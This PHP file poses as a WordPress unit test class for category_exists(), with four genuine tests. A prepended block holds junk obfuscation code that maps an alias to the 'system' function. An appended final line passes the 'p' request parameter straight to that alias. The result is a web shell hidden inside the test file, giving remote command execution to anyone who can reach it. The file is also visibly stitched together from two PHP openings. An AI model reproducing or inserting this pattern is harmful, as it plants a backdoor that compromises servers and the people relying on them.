<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

class Tests_Term_CategoryExists extends WP_UnitTestCase {
	/**
	 * @ticket 30975
	 */
	public function test_category_exists_should_return_only_top_level_categories_when_parent_is_0() {
		$c1 = self::factory()->category->create();
		$c2 = self::factory()->category->create(
			array(
				'name'   => 'Foo',
				'parent' => $c1,
			)
		);
		$c3 = self::factory()->category->create(
			array(
				'name' => 'Foo',
			)
		);

		$found = category_exists( 'Foo', 0 );

		$this->assertEquals( $found, $c3 );
	}

	/**
	 * @ticket 30975
	 */
	public function test_category_exists_should_select_oldest_matching_category_when_no_parent_is_specified_1() {
		// Foo child of c1 is created first.
		$c1 = self::factory()->category->create();
		$c2 = self::factory()->category->create(
			array(
				'name'   => 'Foo',
				'parent' => $c1,
			)
		);
		$c3 = self::factory()->category->create(
			array(
				'name' => 'Foo',
			)
		);

		$found = category_exists( 'Foo' );

		$this->assertEquals( $found, $c2 );
	}

	/**
	 * @ticket 30975
	 */
	public function test_category_exists_should_select_oldest_matching_category_when_no_parent_is_specified_2() {
		// Top-level Foo is created first.
		$c1 = self::factory()->category->create();
		$c2 = self::factory()->category->create(
			array(
				'name' => 'Foo',
			)
		);
		$c3 = self::factory()->category->create(
			array(
				'name'   => 'Foo',
				'parent' => $c1,
			)
		);

		$found = category_exists( 'Foo' );

		$this->assertEquals( $found, $c2 );
	}

	/**
	 * @ticket 30975
	 */
	public function test_category_exists_should_respect_nonempty_parent() {
		$c1 = self::factory()->category->create();
		$c2 = self::factory()->category->create(
			array(
				'name'   => 'Foo',
				'parent' => $c1,
			)
		);
		$c3 = self::factory()->category->create(
			array(
				'name' => 'Foo',
			)
		);

		$found = category_exists( 'Foo', $c1 );

		$this->assertEquals( $found, $c2 );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>